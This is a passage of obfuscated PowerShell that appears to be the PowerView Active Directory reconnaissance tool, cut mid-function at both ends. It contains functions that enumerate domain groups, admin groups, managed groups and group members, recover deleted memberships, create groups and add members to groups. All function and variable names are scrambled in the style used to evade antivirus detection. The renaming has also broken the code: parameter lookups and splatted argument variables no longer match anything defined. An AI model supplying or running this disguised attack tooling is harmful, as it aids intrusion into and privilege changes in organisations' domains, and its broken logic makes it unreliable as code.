                        $jiHKRwfa99 = $JmddWUUS99.Replace('\28', '(').Replace('\29', ')') | jiggering -hKoxCyte99 Canonical
                        if ($jiHKRwfa99) {
                            $rmBBqKQq99 = $jiHKRwfa99.SubString(0, $jiHKRwfa99.IndexOf('/'))
                            $nVmmyinF99 = $JmddWUUS99.Split('\')[1]
                            $zdhlwIap99 += "(samAccountName=$nVmmyinF99)"
                            $xfOIjAld99['Domain'] = $rmBBqKQq99
                            Write-Verbose "[grownup] Extracted domain '$rmBBqKQq99' from '$JmddWUUS99'"
                            $wlpGtuuA99 = foaling @SearcherArguments
                        }
                    }
                    else {
                        $zdhlwIap99 += "(|(samAccountName=$JmddWUUS99)(name=$JmddWUUS99))"
                    }
                }

                if ($zdhlwIap99 -and ($zdhlwIap99.Trim() -ne '') ) {
                    $cqPynTGG99 += "(|$zdhlwIap99)"
                }

                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[grownup] Searching for adminCount=1'
                    $cqPynTGG99 += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $wudbmxsJ99 = $PSBoundParameters['GroupScope']
                    $cqPynTGG99 = Switch ($wudbmxsJ99) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[grownup] Searching for group scope '$wudbmxsJ99'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $qRGVQUwN99 = $PSBoundParameters['GroupProperty']
                    $cqPynTGG99 = Switch ($qRGVQUwN99) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[grownup] Searching for group property '$qRGVQUwN99'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[grownup] Using additional LDAP filter: $RUtJqxpA99"
                    $cqPynTGG99 += "$RUtJqxpA99"
                }

                $wlpGtuuA99.filter = "(&(objectCategory=group)$cqPynTGG99)"
                Write-Verbose "[grownup] filter string: $($wlpGtuuA99.filter)"

                if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $wlpGtuuA99.FindOne() }
                else { $vDOGrGBR99 = $wlpGtuuA99.FindAll() }
                $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $Group = $_
                    }
                    else {
                        $Group = meridian -kaLEgole99 $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($vDOGrGBR99) {
                    try { $vDOGrGBR99.dispose() }
                    catch {
                        Write-Verbose "[grownup] Error disposing of the Results object"
                    }
                }
                $wlpGtuuA99.dispose()
            }
        }
    }
}


function sterilizers {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $dABDhgNe99,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $WxzTuYkd99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ghlbqhmM99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    $rdEReMRy99 = @{
        'Identity' = $dABDhgNe99
    }
    if ($PSBoundParameters['Domain']) { $rdEReMRy99['Domain'] = $XQOKQXGr99 }
    if ($PSBoundParameters['Credential']) { $rdEReMRy99['Credential'] = $ZiReXCQu99 }
    $ezvcgGct99 = starched @ContextArguments

    if ($ezvcgGct99) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($ezvcgGct99.Context)

        $Group.SamAccountName = $ezvcgGct99.Identity

        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $ezvcgGct99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $WxzTuYkd99
        }
        else {
            $Group.DisplayName = $ezvcgGct99.Identity
        }

        if ($PSBoundParameters['Description']) {
            $Group.Description = $ghlbqhmM99
        }

        Write-Verbose "[sterilizers] Attempting to create group '$dABDhgNe99'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[sterilizers] Group '$dABDhgNe99' successfully created"
            $Group
        }
        catch {
            Write-Warning "[sterilizers] Error creating group '$dABDhgNe99' : $_"
        }
    }
}


function fermenting {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $xfOIjAld99 = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['SecurityMasks']) { $xfOIjAld99['SecurityMasks'] = $iKRjUkvW99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $xfOIjAld99['Domain'] = $XQOKQXGr99
            $bfrmITkR99 = $XQOKQXGr99
        }
        else {
            $bfrmITkR99 = $Env:USERDNSDOMAIN
        }

        grownup @SearcherArguments | ForEach-Object {
            $xfOIjAld99['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $xfOIjAld99['Identity'] = $_.managedBy
            $Null = $xfOIjAld99.Remove('LDAPFilter')

            $NvrZAHuQ99 = grow @SearcherArguments
            $qXinpjuh99 = New-Object PSObject
            $qXinpjuh99 | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $qXinpjuh99 | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $qXinpjuh99 | Add-Member Noteproperty 'ManagerName' $NvrZAHuQ99.samaccountname
            $qXinpjuh99 | Add-Member Noteproperty 'ManagerDistinguishedName' $NvrZAHuQ99.distinguishedName

            if ($NvrZAHuQ99.samaccounttype -eq 0x10000000) {
                $qXinpjuh99 | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($NvrZAHuQ99.samaccounttype -eq 0x30000000) {
                $qXinpjuh99 | Add-Member Noteproperty 'ManagerType' 'User'
            }

            $WXufDIdO99 = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $WXufDIdO99['Server'] = $VmSwBdTN99 }
            if ($PSBoundParameters['SearchScope']) { $WXufDIdO99['SearchScope'] = $YtWADKZe99 }
            if ($PSBoundParameters['ResultPageSize']) { $WXufDIdO99['ResultPageSize'] = $JYnIcwBJ99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $WXufDIdO99['ServerTimeLimit'] = $fEdVcXRd99 }
            if ($PSBoundParameters['Tombstone']) { $WXufDIdO99['Tombstone'] = $uomKXjrL99 }
            if ($PSBoundParameters['Credential']) { $WXufDIdO99['Credential'] = $ZiReXCQu99 }


            $qXinpjuh99 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'

            $qXinpjuh99.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $qXinpjuh99
        }
    }
}


function pinup {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $HabetmIe99,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $hNatUVDD99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $xfOIjAld99 = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['LDAPFilter']) { $xfOIjAld99['LDAPFilter'] = $RUtJqxpA99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }

        $QiaDxgyH99 = @{}
        if ($PSBoundParameters['Domain']) { $QiaDxgyH99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Server']) { $QiaDxgyH99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['Credential']) { $QiaDxgyH99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        $wlpGtuuA99 = foaling @SearcherArguments
        if ($wlpGtuuA99) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $xfOIjAld99['Identity'] = $aCzrnrLk99
                $xfOIjAld99['Raw'] = $True
                $Group = grownup @SearcherArguments

                if (-not $Group) {
                    Write-Warning "[pinup] Error searching for group with identity: $aCzrnrLk99"
                }
                else {
                    $spSOZkEy99 = $Group.properties.item('samaccountname')[0]
                    $xpNDpRwD99 = $Group.properties.item('distinguishedname')[0]

                    if ($PSBoundParameters['Domain']) {
                        $HMegPJjq99 = $XQOKQXGr99
                    }
                    else {
                        if ($xpNDpRwD99) {
                            $HMegPJjq99 = $xpNDpRwD99.SubString($xpNDpRwD99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[pinup] Using LDAP matching rule to recurse on '$xpNDpRwD99', only user accounts will be returned."
                    $wlpGtuuA99.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$xpNDpRwD99))"
                    $wlpGtuuA99.PropertiesToLoad.AddRange(('distinguishedName'))
                    $gFZrRmbI99 = $wlpGtuuA99.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $xfOIjAld99.Remove('Raw')
            }
            else {
                $zdhlwIap99 = ''
                $cqPynTGG99 = ''
                $aCzrnrLk99 | Where-Object {$_} | ForEach-Object {
                    $JmddWUUS99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($JmddWUUS99 -match '^S-1-') {
                        $zdhlwIap99 += "(objectsid=$JmddWUUS99)"
                    }
                    elseif ($JmddWUUS99 -match '^CN=') {
                        $zdhlwIap99 += "(distinguishedname=$JmddWUUS99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $MuprcxcZ99 = $JmddWUUS99.SubString($JmddWUUS99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[pinup] Extracted domain '$MuprcxcZ99' from '$JmddWUUS99'"
                            $xfOIjAld99['Domain'] = $MuprcxcZ99
                            $wlpGtuuA99 = foaling @SearcherArguments
                            if (-not $wlpGtuuA99) {
                                Write-Warning "[pinup] Unable to retrieve domain searcher for '$MuprcxcZ99'"
                            }
                        }
                    }
                    elseif ($JmddWUUS99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $osroZIBb99 = (([Guid]$JmddWUUS99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $zdhlwIap99 += "(objectguid=$osroZIBb99)"
                    }
                    elseif ($JmddWUUS99.Contains('\')) {
                        $jiHKRwfa99 = $JmddWUUS99.Replace('\28', '(').Replace('\29', ')') | jiggering -hKoxCyte99 Canonical
                        if ($jiHKRwfa99) {
                            $rmBBqKQq99 = $jiHKRwfa99.SubString(0, $jiHKRwfa99.IndexOf('/'))
                            $nVmmyinF99 = $JmddWUUS99.Split('\')[1]
                            $zdhlwIap99 += "(samAccountName=$nVmmyinF99)"
                            $xfOIjAld99['Domain'] = $rmBBqKQq99
                            Write-Verbose "[pinup] Extracted domain '$rmBBqKQq99' from '$JmddWUUS99'"
                            $wlpGtuuA99 = foaling @SearcherArguments
                        }
                    }
                    else {
                        $zdhlwIap99 += "(samAccountName=$JmddWUUS99)"
                    }
                }

                if ($zdhlwIap99 -and ($zdhlwIap99.Trim() -ne '') ) {
                    $cqPynTGG99 += "(|$zdhlwIap99)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[pinup] Using additional LDAP filter: $RUtJqxpA99"
                    $cqPynTGG99 += "$RUtJqxpA99"
                }

                $wlpGtuuA99.filter = "(&(objectCategory=group)$cqPynTGG99)"
                Write-Verbose "[pinup] pinup filter string: $($wlpGtuuA99.filter)"
                try {
                    $BSvRtRei99 = $wlpGtuuA99.FindOne()
                }
                catch {
                    Write-Warning "[pinup] Error searching for group with identity '$aCzrnrLk99': $_"
                    $gFZrRmbI99 = @()
                }

                $spSOZkEy99 = ''
                $xpNDpRwD99 = ''

                if ($BSvRtRei99) {
                    $gFZrRmbI99 = $BSvRtRei99.properties.item('member')

                    if ($gFZrRmbI99.count -eq 0) {
                        $zfbXYVng99 = $False
                        $ktsDVpQu99 = 0
                        $Top = 0

                        while (-not $zfbXYVng99) {
                            $Top = $ktsDVpQu99 + 1499
                            $ApCrHfLw99="member;range=$ktsDVpQu99-$Top"
                            $ktsDVpQu99 += 1500
                            $Null = $wlpGtuuA99.PropertiesToLoad.Clear()
                            $Null = $wlpGtuuA99.PropertiesToLoad.Add("$ApCrHfLw99")
                            $Null = $wlpGtuuA99.PropertiesToLoad.Add('samaccountname')
                            $Null = $wlpGtuuA99.PropertiesToLoad.Add('distinguishedname')

                            try {
                                $BSvRtRei99 = $wlpGtuuA99.FindOne()
                                $vPDtEdVA99 = $BSvRtRei99.Properties.PropertyNames -like "member;range=*"
                                $gFZrRmbI99 += $BSvRtRei99.Properties.item($vPDtEdVA99)
                                $spSOZkEy99 = $BSvRtRei99.properties.item('samaccountname')[0]
                                $xpNDpRwD99 = $BSvRtRei99.properties.item('distinguishedname')[0]

                                if ($gFZrRmbI99.count -eq 0) {
                                    $zfbXYVng99 = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $zfbXYVng99 = $True
                            }
                        }
                    }
                    else {
                        $spSOZkEy99 = $BSvRtRei99.properties.item('samaccountname')[0]
                        $xpNDpRwD99 = $BSvRtRei99.properties.item('distinguishedname')[0]
                        $gFZrRmbI99 += $BSvRtRei99.Properties.item($vPDtEdVA99)
                    }

                    if ($PSBoundParameters['Domain']) {
                        $HMegPJjq99 = $XQOKQXGr99
                    }
                    else {
                        if ($xpNDpRwD99) {
                            $HMegPJjq99 = $xpNDpRwD99.SubString($xpNDpRwD99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($mNFtVFpM99 in $gFZrRmbI99) {
                if ($HabetmIe99 -and $siAtmuHy99) {
                    $kaLEgole99 = $_.Properties
                }
                else {
                    $EEyCZzye99 = $xfOIjAld99.Clone()
                    $EEyCZzye99['Identity'] = $mNFtVFpM99
                    $EEyCZzye99['Raw'] = $True
                    $EEyCZzye99['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = grow @ObjectSearcherArguments
                    $kaLEgole99 = $Object.Properties
                }

                if ($kaLEgole99) {
                    $jRWBsCUp99 = New-Object PSObject
                    $jRWBsCUp99 | Add-Member Noteproperty 'GroupDomain' $HMegPJjq99
                    $jRWBsCUp99 | Add-Member Noteproperty 'GroupName' $spSOZkEy99
                    $jRWBsCUp99 | Add-Member Noteproperty 'GroupDistinguishedName' $xpNDpRwD99

                    if ($kaLEgole99.objectsid) {
                        $aVnzkMKs99 = ((New-Object System.Security.Principal.SecurityIdentifier $kaLEgole99.objectsid[0], 0).Value)
                    }
                    else {
                        $aVnzkMKs99 = $Null
                    }

                    try {
                        $jwWMvWVS99 = $kaLEgole99.distinguishedname[0]
                        if ($jwWMvWVS99 -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $aVnzkMKs99) {
                                    $aVnzkMKs99 = $kaLEgole99.cn[0]
                                }
                                $orYwbxxj99 = jiggering -aCzrnrLk99 $aVnzkMKs99 -hKoxCyte99 'DomainSimple' @ADNameArguments

                                if ($orYwbxxj99) {
                                    $fWOeDubU99 = $orYwbxxj99.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[pinup] Error converting $jwWMvWVS99"
                                    $fWOeDubU99 = $Null
                                }
                            }
                            catch {
                                Write-Warning "[pinup] Error converting $jwWMvWVS99"
                                $fWOeDubU99 = $Null
                            }
                        }
                        else {
                            $fWOeDubU99 = $jwWMvWVS99.SubString($jwWMvWVS99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $jwWMvWVS99 = $Null
                        $fWOeDubU99 = $Null
                    }

                    if ($kaLEgole99.samaccountname) {
                        $ebkBXIst99 = $kaLEgole99.samaccountname[0]
                    }
                    else {
                        try {
                            $ebkBXIst99 = retrain -ObjectSID $kaLEgole99.cn[0] @ADNameArguments
                        }
                        catch {
                            $ebkBXIst99 = $kaLEgole99.cn[0]
                        }
                    }

                    if ($kaLEgole99.objectclass -match 'computer') {
                        $OSVBCybU99 = 'computer'
                    }
                    elseif ($kaLEgole99.objectclass -match 'group') {
                        $OSVBCybU99 = 'group'
                    }
                    elseif ($kaLEgole99.objectclass -match 'user') {
                        $OSVBCybU99 = 'user'
                    }
                    else {
                        $OSVBCybU99 = $Null
                    }
                    $jRWBsCUp99 | Add-Member Noteproperty 'MemberDomain' $fWOeDubU99
                    $jRWBsCUp99 | Add-Member Noteproperty 'MemberName' $ebkBXIst99
                    $jRWBsCUp99 | Add-Member Noteproperty 'MemberDistinguishedName' $jwWMvWVS99
                    $jRWBsCUp99 | Add-Member Noteproperty 'MemberObjectClass' $OSVBCybU99
                    $jRWBsCUp99 | Add-Member Noteproperty 'MemberSID' $aVnzkMKs99
                    $jRWBsCUp99.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $jRWBsCUp99

                    if ($PSBoundParameters['Recurse'] -and $jwWMvWVS99 -and ($OSVBCybU99 -match 'group')) {
                        Write-Verbose "[pinup] Manually recursing on group: $jwWMvWVS99"
                        $xfOIjAld99['Identity'] = $jwWMvWVS99
                        $Null = $xfOIjAld99.Remove('Properties')
                        pinup @SearcherArguments
                    }
                }
            }
            $wlpGtuuA99.dispose()
        }
    }
}


function cilium {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $xfOIjAld99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['LDAPFilter']) { $xfOIjAld99['LDAPFilter'] = $RUtJqxpA99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $xfOIjAld99['Identity'] = $aCzrnrLk99 }

        grow @SearcherArguments | ForEach-Object {
            $CGiGIpkb99 = $_.Properties['distinguishedname'][0]
            ForEach($DFCPZpue99 in $_.Properties['msds-replvaluemetadata']) {
                $ruLMOHpr99 = [xml]$DFCPZpue99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($ruLMOHpr99) {
                    if (($ruLMOHpr99.pszAttributeName -Match 'member') -and (($ruLMOHpr99.dwVersion % 2) -eq 0 )) {
                        $BjYCzrxj99 = New-Object PSObject
                        $BjYCzrxj99 | Add-Member NoteProperty 'GroupDN' $CGiGIpkb99
                        $BjYCzrxj99 | Add-Member NoteProperty 'MemberDN' $ruLMOHpr99.pszObjectDn
                        $BjYCzrxj99 | Add-Member NoteProperty 'TimeFirstAdded' $ruLMOHpr99.ftimeCreated
                        $BjYCzrxj99 | Add-Member NoteProperty 'TimeDeleted' $ruLMOHpr99.ftimeDeleted
                        $BjYCzrxj99 | Add-Member NoteProperty 'LastOriginatingChange' $ruLMOHpr99.ftimeLastOriginatingChange
                        $BjYCzrxj99 | Add-Member NoteProperty 'TimesAdded' ($ruLMOHpr99.dwVersion / 2)
                        $BjYCzrxj99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $ruLMOHpr99.pszLastOriginatingDsaDN
                        $BjYCzrxj99.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $BjYCzrxj99
                    }
                }
                else {
                    Write-Verbose "[cilium] Error retrieving 'msds-replvaluemetadata' for '$CGiGIpkb99'"
                }
            }
        }
    }
}


function audiences {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $aCzrnrLk99,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $gFZrRmbI99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $rdEReMRy99 = @{
            'Identity' = $aCzrnrLk99
        }
        if ($PSBoundParameters['Domain']) { $rdEReMRy99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Credential']) { $rdEReMRy99['Credential'] = $ZiReXCQu99 }

        $RdhUCfuI99 = starched @ContextArguments

        if ($RdhUCfuI99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($RdhUCfuI99.Context, $RdhUCfuI99.Identity)
            }
            catch {
                Write-Warning "[audiences] Error finding the group identity '$aCzrnrLk99' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($mNFtVFpM99 in $gFZrRmbI99) {
                if ($mNFtVFpM99 -match '.+\\.+') {
                    $rdEReMRy99['Identity'] = $mNFtVFpM99
                    $RsLbAPnL99 = starched @ContextArguments
                    if ($RsLbAPnL99) {
                        $tcefOwYo99 = $RsLbAPnL99.Identity
                    }
                }
                else {
                    $RsLbAPnL99 = $RdhUCfuI99
                    $tcefOwYo99 = $mNFtVFpM99
                }
                Write-Verbose "[audiences] Adding member '$mNFtVFpM99' to group '$aCzrnrLk99'"
                $mNFtVFpM99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($RsLbAPnL99.Context, $tcefOwYo99)
                $Group.Members.Add($mNFtVFpM99)
                $Group.Save()
            }
        }
    }
}


function lopsided {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $aCzrnrLk99,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $gFZrRmbI99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $rdEReMRy99 = @{
            'Identity' = $aCzrnrLk99
        }
        if ($PSBoundParameters['Domain']) { $rdEReMRy99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Credential']) { $rdEReMRy99['Credential'] = $ZiReXCQu99 }

        $RdhUCfuI99 = starched @ContextArguments

        if ($RdhUCfuI99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($RdhUCfuI99.Context, $RdhUCfuI99.Identity)
            }
            catch {
                Write-Warning "[lopsided] Error finding the group identity '$aCzrnrLk99' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($mNFtVFpM99 in $gFZrRmbI99) {
